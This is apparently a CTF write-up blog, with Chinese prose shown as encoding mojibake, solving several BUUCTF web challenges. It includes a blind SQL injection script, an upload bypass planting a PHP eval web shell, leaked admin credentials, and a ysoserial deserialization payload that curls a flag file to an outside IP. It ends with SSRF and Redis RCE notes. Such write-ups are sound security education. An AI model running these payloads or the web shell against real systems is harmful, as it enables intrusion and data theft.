<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">URL = <span class="string">&#x27;http://1d0f96cf-4b45-4ba0-a938-34ada8597dbf.node4.buuoj.cn:81/vote.php&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">l = <span class="number">0</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">  r = requests.post(URL, data=&#123;</span><br><span class="line">    <span class="string">&#x27;id&#x27;</span>: <span class="string">f&#x27;abs(case(length(hex((select(flag)from(flag))))&amp;<span class="subst">&#123;<span class="number">1</span>&lt;&lt;j&#125;</span>)when(0)then(0)else(0x8000000000000000)end)&#x27;</span></span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="keyword">if</span> <span class="string">b&#x27;An error occurred&#x27;</span> <span class="keyword">in</span> r.content:</span><br><span class="line">    l |= <span class="number">1</span> &lt;&lt; j</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+] length:&#x27;</span>, l)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">table = &#123;&#125;</span><br><span class="line">table[<span class="string">&#x27;A&#x27;</span>] = <span class="string">&#x27;trim(hex((select(name)from(vote)where(case(id)when(3)then(1)end))),12567)&#x27;</span></span><br><span class="line">table[<span class="string">&#x27;C&#x27;</span>] = <span class="string">&#x27;trim(hex(typeof(.1)),12567)&#x27;</span></span><br><span class="line">table[<span class="string">&#x27;D&#x27;</span>] = <span class="string">&#x27;trim(hex(0xffffffffffffffff),123)&#x27;</span></span><br><span class="line">table[<span class="string">&#x27;E&#x27;</span>] = <span class="string">&#x27;trim(hex(0.1),1230)&#x27;</span></span><br><span class="line">table[<span class="string">&#x27;F&#x27;</span>] = <span class="string">&#x27;trim(hex((select(name)from(vote)where(case(id)when(1)then(1)end))),467)&#x27;</span></span><br><span class="line">table[<span class="string">&#x27;B&#x27;</span>] = <span class="string">f&#x27;trim(hex((select(name)from(vote)where(case(id)when(4)then(1)end))),16||<span class="subst">&#123;table[<span class="string">&quot;C&quot;</span>]&#125;</span>||<span class="subst">&#123;table[<span class="string">&quot;F&quot;</span>]&#125;</span>)&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">res = binascii.hexlify(<span class="string">b&#x27;flag&#123;61aee2ee-4901-43f4-bc12-a87cce7a6087&#x27;</span>).decode().upper()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(res), l):</span><br><span class="line">  <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;0123456789ABCDEF&#x27;</span>:</span><br><span class="line">    time.sleep(<span class="number">0.05</span>)</span><br><span class="line">    t = <span class="string">&#x27;||&#x27;</span>.join(c <span class="keyword">if</span> c <span class="keyword">in</span> <span class="string">&#x27;0123456789&#x27;</span> <span class="keyword">else</span> table[c] <span class="keyword">for</span> c <span class="keyword">in</span> res + x)</span><br><span class="line">    r = requests.post(URL, data=&#123;</span><br><span class="line">      <span class="string">&#x27;id&#x27;</span>: <span class="string">f&#x27;abs(case(replace(length(replace(hex((select(flag)from(flag))),<span class="subst">&#123;t&#125;</span>,trim(0,0))),<span class="subst">&#123;l&#125;</span>,trim(0,0)))when(trim(0,0))then(0)else(0x8000000000000000)end)&#x27;</span></span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;An error occurred&#x27;</span> <span class="keyword">in</span> r.content:</span><br><span class="line">      res += x</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">f&#x27;[+] flag (<span class="subst">&#123;i&#125;</span>/<span class="subst">&#123;l&#125;</span>): <span class="subst">&#123;res&#125;</span>&#x27;</span>)</span><br><span class="line">  i += <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+] flag:&#x27;</span>, binascii.unhexlify(res).decode())</span><br></pre></td></tr></table></figure>

<p>flag:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;61aee2ee-4901-43f4-bc12-a87cce7a6087&#125;</span><br></pre></td></tr></table></figure>

<h2 id="RoarCTF-2019-Simple-Upload"><a href="#RoarCTF-2019-Simple-Upload" class="headerlink" title="[RoarCTF 2019]Simple Upload"></a>[RoarCTF 2019]Simple Upload</h2><p>ç›´æ¥ç»™äº†<code>IndexController</code>çš„æºç ï¼Œå­˜åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„æ–¹æ³•</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Home</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$uploadFile</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>] ;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (strstr(strtolower(<span class="variable">$uploadFile</span>[<span class="string">&#x27;name&#x27;</span>]), <span class="string">&quot;.php&quot;</span>) ) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$upload</span> = <span class="keyword">new</span> \Think\Upload();<span class="comment">// å®ä¾‹åŒ–ä¸Šä¼ ç±»</span></span><br><span class="line">        <span class="variable">$upload</span>-&gt;maxSize  = <span class="number">4096</span> ;<span class="comment">// è®¾ç½®é™„ä»¶ä¸Šä¼ å¤§å°</span></span><br><span class="line">        <span class="variable">$upload</span>-&gt;allowExts  = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>, <span class="string">&#x27;png&#x27;</span>, <span class="string">&#x27;jpeg&#x27;</span>);<span class="comment">// è®¾ç½®é™„ä»¶ä¸Šä¼ ç±»å‹</span></span><br><span class="line">        <span class="variable">$upload</span>-&gt;rootPath = <span class="string">&#x27;./Public/Uploads/&#x27;</span>;<span class="comment">// è®¾ç½®é™„ä»¶ä¸Šä¼ ç›®å½•</span></span><br><span class="line">        <span class="variable">$upload</span>-&gt;savePath = <span class="string">&#x27;&#x27;</span>;<span class="comment">// è®¾ç½®é™„ä»¶ä¸Šä¼ å­ç›®å½•</span></span><br><span class="line">        <span class="variable">$info</span> = <span class="variable">$upload</span>-&gt;upload() ;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$info</span>) &#123;<span class="comment">// ä¸Šä¼ é”™è¯¯æç¤ºé”™è¯¯ä¿¡æ¯</span></span><br><span class="line">          <span class="keyword">$this</span>-&gt;error(<span class="variable">$upload</span>-&gt;getError());</span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;<span class="comment">// ä¸Šä¼ æˆåŠŸ è·å–ä¸Šä¼ æ–‡ä»¶ä¿¡æ¯</span></span><br><span class="line">          <span class="variable">$url</span> = __ROOT__.substr(<span class="variable">$upload</span>-&gt;rootPath,<span class="number">1</span>).<span class="variable">$info</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;savepath&#x27;</span>].<span class="variable">$info</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;savename&#x27;</span>] ;</span><br><span class="line">          <span class="keyword">echo</span> json_encode(<span class="keyword">array</span>(<span class="string">&quot;url&quot;</span>=&gt;<span class="variable">$url</span>,<span class="string">&quot;success&quot;</span>=&gt;<span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>éšä¾¿ä¼ ä¸€ä¸ªsï¼Œå‘ç°æŠ¥é”™å‡ºç°ç‰ˆæœ¬ä¸º<code>thinkphp3.2.4</code>ï¼Œç›´æ¥ç½‘ä¸Šæ‰¾ä¸€ä¸‹æºç ä¸‹è½½ï¼Œç›´æ¥å»çœ‹<code>Upload</code>ç±»</p>
<p>æ„Ÿè§‰å¯èƒ½å¯ä»¥åˆ©ç”¨çš„ä¹Ÿå°±åªæœ‰<code>$info = $upload-&gt;upload() ;</code></p>
<p>é‚£ä¹ˆç›´æ¥çœ‹ä¸€ä¸‹</p>
<h4 id="å®¡è®¡-1"><a href="#å®¡è®¡-1" class="headerlink" title="å®¡è®¡"></a>å®¡è®¡</h4><p>å¯ä»¥å‘ç°å­˜åœ¨<code>call_user_func</code>æ–¹æ³•ï¼Œä¼šè°ƒç”¨å›è°ƒå‡½æ•°æ‰§è¡Œ<code>$file</code>æ•°ç»„é‡Œé¢çš„å†…å®¹ï¼Œä½†æ˜¯è¿™ä¸ªå›è°ƒå‡½æ•°æˆ‘ä»¬å¹¶ä¸èƒ½å¤Ÿä¿®æ”¹ï¼Œæ‰€ä»¥è¦æƒ³åŠæ³•è¯¥æ€ä¹ˆä¿®æ”¹è¿™ä¸ªå›è°ƒå‡½æ•°æ</p>
<p>æƒ³åˆ°è¿™é“é¢˜æ˜¯æ–‡ä»¶ä¸Šä¼ ï¼Œç”¨åˆ°äº†å¾ˆå¤šçš„æ–‡ä»¶æ“ä½œå‡½æ•°ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ˜¯å¦å¯ä»¥é€šè¿‡<code>phar://</code>åè®®æ¥è§¦å‘ååºåˆ—åŒ–æï¼Œä½†æ˜¯ç®€å•åœ°çœ‹äº†ä¸€éè¿™å’Œå‡½æ•°ä¹‹åå¹¶æ²¡æœ‰å‘ç°å¯ä»¥è§¦å‘çš„åœ°æ–¹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* è°ƒç”¨å›è°ƒå‡½æ•°æ£€æµ‹æ–‡ä»¶æ˜¯å¦å­˜åœ¨ */</span></span><br><span class="line"><span class="variable">$data</span> = call_user_func(<span class="keyword">$this</span>-&gt;callback, <span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;callback &amp;&amp; <span class="variable">$data</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(<span class="string">&#x27;.&#x27;</span> . <span class="variable">$data</span>[<span class="string">&#x27;path&#x27;</span>])) &#123;</span><br><span class="line">          <span class="variable">$info</span>[<span class="variable">$key</span>] = <span class="variable">$data</span>;</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">     &#125; <span class="keyword">elseif</span> (<span class="keyword">$this</span>-&gt;removeTrash) &#123;</span><br><span class="line">          call_user_func(<span class="keyword">$this</span>-&gt;removeTrash, <span class="variable">$data</span>); <span class="comment">//åˆ é™¤åƒåœ¾æ®</span></span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™æ¡è·¯èµ°ä¸é€šï¼Œé‚£è¦ä¸å†æƒ³æƒ³æ˜¯å¦å¯ä»¥ä¸Šä¼ phpæ–‡ä»¶ï¼Ÿ</p>
<p>ä½†æ˜¯ä¼šå‘ç°åªèƒ½ä¸Šä¼ å›¾ç‰‡æ–‡ä»¶ï¼Œå¹¶ä¸”æºç ä¸­ä¹Ÿä¼šåˆ¤æ–­<code>strstr(strtolower($uploadFile[&#39;name&#39;]), &quot;.php&quot;)</code>æ–‡ä»¶åä¸­æ˜¯å¦ä¼šå‡ºç°<code>.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* å¯¹å›¾åƒæ–‡ä»¶è¿›è¡Œä¸¥æ ¼æ£€æµ‹ */</span></span><br><span class="line"><span class="variable">$ext</span> = strtolower(<span class="variable">$file</span>[<span class="string">&#x27;ext&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span> (in_array(<span class="variable">$ext</span>, <span class="keyword">array</span>(<span class="string">&#x27;gif&#x27;</span>, <span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;jpeg&#x27;</span>, <span class="string">&#x27;bmp&#x27;</span>, <span class="string">&#x27;png&#x27;</span>, <span class="string">&#x27;swf&#x27;</span>))) &#123;</span><br><span class="line">   <span class="variable">$imginfo</span> = getimagesize(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">   <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$imginfo</span>) || (<span class="string">&#x27;gif&#x27;</span> == <span class="variable">$ext</span> &amp;&amp; <span class="keyword">empty</span>(<span class="variable">$imginfo</span>[<span class="string">&#x27;bits&#x27;</span>]))) &#123;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;error = <span class="string">&#x27;éæ³•å›¾åƒæ–‡ä»¶ï¼&#x27;</span>;</span><br><span class="line">       <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯åœ¨ä¸‹åˆ—ä»£ç ä¸­å¯¹æ–‡ä»¶åè¿›è¡Œäº†<code>strip_tags</code>æ“ä½œï¼Œä¼šæŠŠphpå’Œhtmlæ ‡è¯†ç¬¦åˆ æ‰ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç»•è¿‡äº†</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// å¯¹ä¸Šä¼ æ–‡ä»¶æ•°ç»„ä¿¡æ¯å¤„ç†</span></span><br><span class="line">        <span class="variable">$files</span> = <span class="keyword">$this</span>-&gt;dealFiles(<span class="variable">$files</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$file</span>) &#123;</span><br><span class="line">            <span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>] = strip_tags(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$file</span>[<span class="string">&#x27;key&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$file</span>[<span class="string">&#x27;key&#x27;</span>] = <span class="variable">$key</span>;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p>expï¼šï¼ˆä½†æ˜¯ä¸ºä»€ä¹ˆè®¿é—®è¿™ä¸ªæ–‡ä»¶ä¹‹åç›´æ¥ç»™äº†æˆ‘flag å•Šå˜å˜</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://bf90b9dc-566d-4408-a099-425349ed8da3.node4.buuoj.cn:81/?s=/&amp;a=upload&#x27;</span></span><br><span class="line"></span><br><span class="line">files = &#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;1.&lt;&gt;php&#x27;</span>, <span class="string">&#x27;&lt;?php eval($_POST[\&#x27;cmd\&#x27;]);?&gt;&#x27;</span>)&#125;</span><br><span class="line"></span><br><span class="line">r = requests.session().post(url, files=files)</span><br><span class="line"><span class="keyword">print</span>(r.text)</span><br><span class="line">    </span><br><span class="line"><span class="comment">// &#123;&quot;url&quot;:&quot;\/Public\/Uploads\/2022-06-26\/62b85e1ac8d12.php&quot;,&quot;success&quot;:1&#125;</span></span><br></pre></td></tr></table></figure>

<h4 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h4><p>å””ï¼Œæ„Ÿè§‰æ¥è¯´ï¼Œè¯»æ‡‚ä»£ç å·²ç»ä¸æ˜¯éš¾äº‹äº†ï¼Œä½†æ˜¯æˆ‘çš„æ€ç»´æ€»æ˜¯æ—¶ä¸æ—¶åœ°é™·å…¥æŸä¸ªç‰›è§’å°–ï¼Œæ€ä¹ˆéƒ½èµ°ä¸å‡ºæ¥</p>
<p>åº”è¯¥è¯´æ˜¯è¿˜æ˜¯å¯¹è¿™äº›ç‰¹æ®Šçš„å‡½æ•°ä¹‹ç±»ä¸å¤ªæ•æ„Ÿ</p>
<h2 id="ç½‘é¼æ¯-2020-æœ±é›€ç»„-Think-Java"><a href="#ç½‘é¼æ¯-2020-æœ±é›€ç»„-Think-Java" class="headerlink" title="[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Think Java"></a>[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Think Java</h2><ul>
<li><p>javaååºåˆ—åŒ–</p>
<p>å­˜åœ¨åŒ…ï¼š<code>import io.swagger.annotations.ApiOperation;</code></p>
<p>ç›´æ¥è®¿é—®<code>swagger-ui.html</code>å¯ä»¥å¾—åˆ°ä¸‰ä¸ªæ¥å£</p>
<p>åœ¨<code>SqlDict,class</code>ä¸­å¯ä»¥å‘ç°å­˜åœ¨sqlæ³¨å…¥</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span>(tableNames.next()) &#123;</span><br><span class="line">    TableName = tableNames.getString(<span class="number">3</span>);</span><br><span class="line">    Table table = <span class="keyword">new</span> Table();</span><br><span class="line">    String sql = <span class="string">&quot;Select TABLE_COMMENT from INFORMATION_SCHEMA.TABLES Where table_schema = &#x27;&quot;</span> + dbName + <span class="string">&quot;&#x27; and table_name=&#x27;&quot;</span> + TableName + <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">    ResultSet rs = stmt.executeQuery(sql);</span><br></pre></td></tr></table></figure></li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/7dfa2ddee3f744f5afc3c309b3d53d01.png"></p>
<p>æµ‹è¯•<code>myapp?a=1&#39; or 1=1#</code>çš„æ—¶å€™å¯ä»¥æŠŠ<code>user</code>è¡¨çš„ä¿¡æ¯ç»™çˆ†ç ´å‡ºæ¥ï¼Œå‘ç°å­˜åœ¨<code>id|name|pwd</code>ï¼Œé‚£ä¹ˆç›´æ¥æ³¨å…¥è·å–ç”¨æˆ·ä¿¡æ¯ç™»å½•</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">name:admin</span><br><span class="line">password:admin@Rrrr_ctf_asde</span><br></pre></td></tr></table></figure>

<p>ç™»å½•ä¹‹åå‘ç°æœ‰base64ç¼–ç çš„å†…å®¹ï¼Œè§£ç ä¹‹åå¾ˆå®¹æ˜“å°±èƒ½çœ‹å‡ºæ¥æ˜¯javaåºåˆ—åŒ–å‡ºæ¥çš„å­—èŠ‚ç ï¼Œè¯´æ˜å­˜åœ¨javaååºåˆ—åŒ–ï¼Œå¯ä»¥åœ¨<code>/common/user/current</code>ä¸­è¿›è¡Œè®¤è¯å®ç°javaååºåˆ—åŒ–çš„è§¦å‘</p>
<p>ç›´æ¥<code>ysoserial</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial.jar ROME &quot;curl 82.156.2.166:8888 -d @/flag&quot; | base64 -w 0</span><br></pre></td></tr></table></figure>

<p>å¾—å‡ºæ¥çš„ç»“æœè¦ç”¨curlä¼ ï¼Œä¸ç„¶ç›‘å¬ä¸åˆ°å†…å®¹</p>
<p>å¾—åˆ°flag</p>
<h2 id="ç½‘é¼æ¯-2020-ç„æ­¦ç»„-SSRFMe"><a href="#ç½‘é¼æ¯-2020-ç„æ­¦ç»„-SSRFMe" class="headerlink" title="[ç½‘é¼æ¯ 2020 ç„æ­¦ç»„]SSRFMe"></a>[ç½‘é¼æ¯ 2020 ç„æ­¦ç»„]SSRFMe</h2><p>ç›´æ¥ç»™äº†ä¸€ç‚¹æºç ï¼Œå¯ä»¥å‘ç°åœ¨æ–¹æ³•<code>safe_request_url</code>ä¸­å­˜åœ¨<code>curl_exec</code>å‡½æ•°å¯¼è‡´phpçš„SSRFï¼Œæ‰€ä»¥åœ¨<code>check_inner_ip</code>ä¸­è¦è¿”å›falseå¹¶ä¸”ä¸èƒ½dieäº†</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_request_url</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (check_inner_ip(<span class="variable">$url</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$url</span>.<span class="string">&#x27; is inner ip&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$ch</span> = curl_init();</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">        <span class="variable">$output</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$result_info</span> = curl_getinfo(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result_info</span>[<span class="string">&#x27;redirect_url&#x27;</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            safe_request_url(<span class="variable">$result_info</span>[<span class="string">&#x27;redirect_url&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close(<span class="variable">$ch</span>);</span><br><span class="line">        var_dump(<span class="variable">$output</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>check_inner_ip</code>è¦æ±‚ä½¿ç”¨çš„åè®®åªèƒ½æ˜¯<code>http|https|gopher|dict</code>ï¼Œå¹¶ä¸”è¦æ±‚ipä¸èƒ½æ˜¯<code>127.0.0.0|10.0.0.0|172.16.0.0|192.168.0.0</code>ç­‰æ ¼å¼ï¼Œä½†æ˜¯æˆ‘ä»¬å¤§å¤šæ•°çš„æ—¶å€™ä¼šç”¨åˆ°<code>127.0.0.1</code>ï¼Œæ‰€ä»¥å¿…é¡»è¦ç»•è¿‡ï¼Œå¯ä»¥å‘ç°<code>parse_url</code>æ˜¯å­˜åœ¨æ¼æ´çš„ï¼Œç›´æ¥åˆ©ç”¨å®ƒç»•è¿‡å§</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_inner_ip</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$match_result</span>=preg_match(<span class="string">&#x27;/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/&#x27;</span>,<span class="variable">$url</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$match_result</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$url_parse</span>=parse_url(<span class="variable">$url</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$hostname</span>=<span class="variable">$url_parse</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    <span class="variable">$ip</span>=gethostbyname(<span class="variable">$hostname</span>);</span><br><span class="line">    <span class="variable">$int_ip</span>=ip2long(<span class="variable">$ip</span>);</span><br><span class="line">    <span class="keyword">return</span> ip2long(<span class="string">&#x27;127.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">&#x27;10.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">&#x27;172.16.0.0&#x27;</span>)&gt;&gt;<span class="number">20</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">20</span> || ip2long(<span class="string">&#x27;192.168.0.0&#x27;</span>)&gt;&gt;<span class="number">16</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">16</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="parse-url"><a href="#parse-url" class="headerlink" title="parse_url"></a>parse_url</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$a</span> = <span class="string">&#x27;http:///127.0.0.1?url=1&#x27;</span>;</span><br><span class="line">	var_dump(parse_url(<span class="variable">$a</span>)); <span class="comment">//false</span></span><br></pre></td></tr></table></figure>

<h4 id="åšé¢˜-3"><a href="#åšé¢˜-3" class="headerlink" title="åšé¢˜"></a>åšé¢˜</h4><h5 id="å°è¯•"><a href="#å°è¯•" class="headerlink" title="å°è¯•"></a>å°è¯•</h5><p>ä¼šå¯¼è‡´<code>ip2long(&#39;192.168.0.0&#39;)&gt;&gt;16 == $int_ip&gt;&gt;16</code>è¿”å›trueï¼Œå¯ä»¥ç”¨<code>0.0.0.0</code>ç»•è¿‡</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">var_dump(gethostbyname(<span class="string">&quot;&quot;</span>)); <span class="comment">//ä¼šè‡ªåŠ¨è·å–æœ¬æœºçš„ipåœ°å€</span></span><br></pre></td></tr></table></figure>

<p><code>hint.php</code>ï¼Œç»å…¸åˆ©ç”¨base64ç»•è¿‡<code>exit()</code>ï¼Œä½†æ˜¯è¿™é‡Œæœ‰ç‚¹éš¾æ„é€ å› ä¸ºä»–ä¼šæŠŠpostä¼ çš„å‚æ•°ä¹Ÿç›´æ¥æ”¾åˆ°äº†æ–‡ä»¶å†…å®¹é‡Œé¢ï¼Œå› ä¸ºbaseè§£ç çš„æ—¶å€™ä¼šæ•è·åˆ°æœ€åä¸€ä¸ª<code>=</code>ï¼Œæ‰€ä»¥æœ€ç»ˆè¿˜æ˜¯æ²¡ç”¨baseï¼Œä½†æ˜¯è¯•è¿‡ä¹‹åå‘ç°å†™ä¸è¿›å»ï¼Œåº”è¯¥æ˜¯æ²¡æœ‰æƒé™</p>
<p><a href="https://www.cnblogs.com/yokan/p/12650702.html">file_put_contentsåˆ©ç”¨æŠ€å·§(php://filteråè®®ï¼‰ - yokan - åšå®¢å›­ (cnblogs.com)</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]===<span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">  file_put_contents(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>],<span class="string">&quot;&lt;?php echo &#x27;redispass is root&#x27;;exit();&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æºç ç»™äº†hintï¼Œå­˜åœ¨<code>redis</code>ï¼Œé‚£ä¹ˆ<code>ssrf+redis</code></p>
<h5 id="redisä¸»ä»å¤åˆ¶RCE"><a href="#redisä¸»ä»å¤åˆ¶RCE" class="headerlink" title="redisä¸»ä»å¤åˆ¶RCE"></a>redisä¸»ä»å¤åˆ¶RCE</h5><p><a href="https://github.com/xmsec/redis-ssrf">https://github.com/xmsec/redis-ssrf</a></p>
<p><a href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a></p>
<p>å¾—å…ˆå»çœ‹ä¸€ä¸‹<code>redis</code>çš„ä¿¡æ¯ï¼Œä½†æ˜¯æ²¡æœ‰æƒé™çœ‹ï¼Œç›´æ¥gopheråè®®æ‰“ï¼Œç”¨ä¸Šé¢ä¸¤ä¸ªå·¥å…·</p>
